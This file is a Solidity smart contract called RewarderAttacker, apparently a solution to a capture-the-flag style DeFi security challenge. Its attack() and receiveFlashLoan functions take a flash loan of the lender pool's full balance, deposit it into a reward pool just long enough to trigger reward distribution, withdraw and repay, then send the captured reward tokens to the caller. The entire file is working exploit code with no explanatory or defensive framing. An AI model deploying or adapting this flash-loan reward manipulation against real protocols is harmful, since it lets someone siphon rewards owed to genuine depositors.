// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

pragma solidity ^0.8.0;

interface ITheRewarderPool {
	function deposit(uint256) external;
	function withdraw(uint256) external;
	function distributeRewards() external returns (uint256);
}

interface IFlashLoanerPool {
	function flashLoan(uint256) external;
}

contract RewarderAttacker {

	address loanAddress;
	address poolAddress;
	address liquidityTokenAddress;
	address rewardTokenAddress;
	
	IFlashLoanerPool loanInterface;
	ITheRewarderPool poolInterface;
	IERC20 liquidityTokenInterface;
	IERC20 rewardTokenInterface;

	constructor(address _poolAddress, address _loanAddress, address _liquidityTokenAddress, address _rewardTokenAddress) {
		loanAddress = _loanAddress;
		poolAddress = _poolAddress;
		liquidityTokenAddress = _liquidityTokenAddress;
		rewardTokenAddress = _rewardTokenAddress;
		
		loanInterface = IFlashLoanerPool(loanAddress);
		poolInterface = ITheRewarderPool(poolAddress);
		liquidityTokenInterface = IERC20(liquidityTokenAddress);
		rewardTokenInterface = IERC20(rewardTokenAddress);
	}

	function attack() public {
		uint256 totalBorrowable = liquidityTokenInterface.balanceOf(loanAddress);
		loanInterface.flashLoan(totalBorrowable);	
		uint256 totalRewards = rewardTokenInterface.balanceOf(address(this));
		rewardTokenInterface.transfer(tx.origin, totalRewards);
	}

	function receiveFlashLoan(uint256 amountReceived) external {
		liquidityTokenInterface.approve(poolAddress, amountReceived);
		poolInterface.deposit(amountReceived);
		poolInterface.distributeRewards();
		poolInterface.withdraw(amountReceived);
		liquidityTokenInterface.transfer(loanAddress, amountReceived);
	}
}
